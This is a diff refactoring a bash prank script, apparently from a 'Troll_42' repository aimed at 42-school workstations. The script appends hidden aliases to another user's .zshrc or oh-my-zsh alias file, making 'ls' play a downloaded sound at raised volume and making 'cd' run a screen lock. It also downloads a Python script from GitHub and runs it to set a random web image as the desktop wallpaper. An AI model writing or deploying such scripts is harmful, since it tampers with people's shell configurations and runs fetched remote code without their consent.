@@ -1,70 +1,73 @@
 #!/bin/bash
 
-function remove_prev_lsound_zsh()
-{
-	rm -f $(sed -nE 's|.*(~/.*\.ogg).*|\1|p' ~/.zshrc)
-	alias_at_line=$(grep -nE "#lsound_[0-9a-f]{12}" ~/.zshrc)
-	alias_at_line=${alias_at_line/:*/}
-	sed -i "${alias_at_line}d" ~/.zshrc
-}
 
-function do_ls_zsh()
-{
-	if [ "$(grep -E "#lsound_[0-9a-f]{12}" ~/.zshrc)" ]; then
-		remove_prev_lsound_zsh
-	fi
-	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.${SOUND}.wav &) ; ls $1 #lsound_${RANDOM_ID}'" >> ~/.zshrc
-	curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/gg.wav -o ~/.gg.wav
-}
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
+#> lsound
 
-function remove_prev_lsound_oh_my_zsh()
+function remove_prev_lsound()
 {
 
-	file_to_remove=$(sed -nE 's|.*(~/.*\.ogg).*|\1|p' ~/.oh-my-zsh/custom/alias.zsh)
+	file_to_remove=$(sed -nE 's|.*(~/.*\.ogg).*|\1|p' ${ALIAS_FILE})
 	rm -f ${file_to_remove}
-	alias_at_line=$(grep -nE "#lsound_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)
+	alias_at_line=$(grep -nE "#lsound_[0-9a-f]{12}" ${ALIAS_FILE})
 	alias_at_line=${alias_at_line/:*/}
-	sed -i "${alias_at_line}d" ~/.oh-my-zsh/custom/alias.zsh
+	sed -i "${alias_at_line}d" ${ALIAS_FILE}
 }
 
-function do_ls_oh_my_zsh()
+function do_ls()
 {
-	if [ "$(grep -E "#lsound_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)" ]; then
-		remove_prev_lsound_oh_my_zsh
+	if [ "$(grep -E "#lsound_[0-9a-f]{12}" ${ALIAS_FILE})" ]; then
+		if [ "$(sed -nE 's|.*~/\.(.*\.ogg).*|\1|p' ${ALIAS_FILE})" != \
+			 "${SOUND}"]; then
+			remove_prev_lsound
+		else
+			printf "%s is already installed\n" ${SOUND}
+			return
+		fi
 	fi
-	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.${SOUND}.ogg &) ; ls -G $1 #lsound_${RANDOM_ID}'" >> ~/.oh-my-zsh/custom/alias.zsh
+	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.${SOUND}.ogg &) ; ls -G $1 #lsound_${RANDOM_ID}'" >> ${ALIAS_FILE}
 	curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/${SOUND}.ogg -o ~/.${SOUND}.ogg
 }
 
-function remove_prev_lokcd_zsh()
-{
-	alias_at_line=$(grep -nE "#lokcd_[0-9a-f]{12}" ~/.zshrc)
-	alias_at_line=${alias_at_line/:*/}
-	sed -i "${alias_at_line}d" ~/.zshrc
-}
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
 
-function do_lokcd_zsh()
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
+#> lokcd
+
+# function remove_prev_lokcd()
+# {
+# 	alias_at_line=$(grep -nE "#lokcd_[0-9a-f]{12}" ${ALIAS_FILE})
+# 	alias_at_line=${alias_at_line/:*/}
+# 	sed -i "${alias_at_line}d" ${ALIAS_FILE}
+# }
+
+function do_lokcd()
 {
-	if [ "$(grep -E "#lokcd_[0-9a-f]{12}" ~/.zshrc)" ]; then
-		remove_prev_lokcd_zsh
+	if [ "$(grep -E "#lokcd_[0-9a-f]{12}" ${ALIAS_FILE})" ]; then
+		printf "lokcd already installed\n"
+	else
+		echo "alias cd='ft_lock #lokcd_${RANDOM_ID}'" >> ${ALIAS_FILE}
 	fi
-	echo "alias cd='ft_lock #lokcd_${RANDOM_ID}'" >> ~/.zshrc
 }
 
-function remove_prev_lokcd_oh_my_zsh()
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
+
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
+#> wallpaper
+
+function do_wallpaper_change()
 {
-	alias_at_line=$(grep -nE "#lokcd_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)
-	alias_at_line=${alias_at_line/:*/}
-	sed -i "${alias_at_line}d" ~/.oh-my-zsh/custom/alias.zsh
+	python3 /nfs/homes/$USER/.config/bbid.py -s ${WALLPAPER} --limit 1 -o downloads
+	mv ./downloads/* /nfs/homes/$USER/Documents/.image.jpg
+	rm -rf ./downloads/*
+	gsettings set org.gnome.desktop.background picture-uri 'file:///nfs/homes/'$USER'/Documents/.image.jpg'
 }
 
-function do_lokcd_oh_my_zsh()
-{
-	if [ "$(grep -E "#lokcd_[0-9a-f]{12}" ~/.oh-my-zsh/custom/alias.zsh)" ]; then
-		remove_prev_lokcd_oh_my_zsh
-	fi
-	echo "alias cd='ft_lock #lokcd_${RANDOM_ID}'" >> ~/.oh-my-zsh/custom/alias.zsh
-}
+
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
+
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
+#> main
 
 function retrieve_shell()
 {
@@ -83,38 +86,30 @@ function retrieve_shell()
 	fi
 }
 
-function wallpaper_changer()
+function do_backup()
 {
-	python3 /tmp/bbid.py -s ${WALLPAPER} --limit 1 -o downloads
-	mv ./downloads/* /nfs/homes/$USER/Documents/.image.jpg
-	rm -rf ./downloads/*
-	gsettings set org.gnome.desktop.background picture-uri 'file:///nfs/homes/'$USER'/Documents/.image.jpg'
-}
-
-function do_backup_zsh()
-{
-	if [ ! -f ~/.oh-my-zsh/custom/.alias.zsh.backup ]; then
-		cp ~/.zshrc ~/.zshrc.${RANDOM_ID}
-		touch .zshrc.backup
-	fi
-}
-
-function do_backup_oh_my_zsh()
-{
-	if [ ! -f ~/.oh-my-zsh/custom/.alias.zsh.backup ]; then
-		cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.alias.zsh.${RANDOM_ID}
-		touch ~/.oh-my-zsh/custom/.alias.zsh.backup
+	if [ -z "$(ls -a ${ALIAS_FILE%\/*} | \
+			  grep -E "${ALIAS_FILE/*\//}\.[0-9a-f]{12}")" ]; then
+		cp ${ALIAS_FILE} ${ALIAS_FILE}.${RANDOM_ID}
 	fi
 }
 
 function init()
 {
-	RANDOM_ID=$(openssl rand -hex 6)
 	retrieve_shell
-	if [ ! -f /tmp/bbid.py ]; then
+	if [ "${CURRENT_SHELL}" == "zsh" ]; then
+		ALIAS_FILE="${HOME}/.zshrc"
+	elif [ "${CURRENT_SHELL}" == "oh-my-zsh" ]; then
+		ALIAS_FILE="${HOME}/.oh-my-zsh/custom/alias.zsh"
+	else
+		printf "Bash not implemented\n"
+		exit 1
+	fi
+	RANDOM_ID=$(openssl rand -hex 6)
+	if [ ! -f /nfs/homes/$USER/.config/bbid.py ]; then
 		wget https://raw.githubusercontent.com/clinche/Troll_42/master/bbid.py \
-			-O /tmp/bbid.py
-		chmod +x /tmp/bbid.py
+			-O /nfs/homes/$USER/.config/bbid.py
+		chmod +x /nfs/homes/$USER/.config/bbid.py
 	fi
 }
 
@@ -127,18 +122,10 @@ function clear_and_exit()
 function main()
 {
 	init
-	wallpaper_changer
-	if [ "${CURRENT_SHELL}" == "zsh" ]; then
-		do_backup_zsh
-		do_ls_zsh
-		do_lokcd_zsh
-	elif [ "${CURRENT_SHELL}" == "oh-my-zsh" ]; then
-		do_backup_oh_my_zsh
-		do_ls_oh_my_zsh
-		do_lokcd_oh_my_zsh
-	else
-		printf "Bash not implemented\n"
-	fi
+	do_backup
+	do_wallpaper_change
+	do_ls
+	do_lokcd
 	#clear_and_exit
 }
 
@@ -150,3 +137,5 @@ if [ -z "${WALLPAPER}" ]; then
 fi
 
 main
+
+#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#==#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#
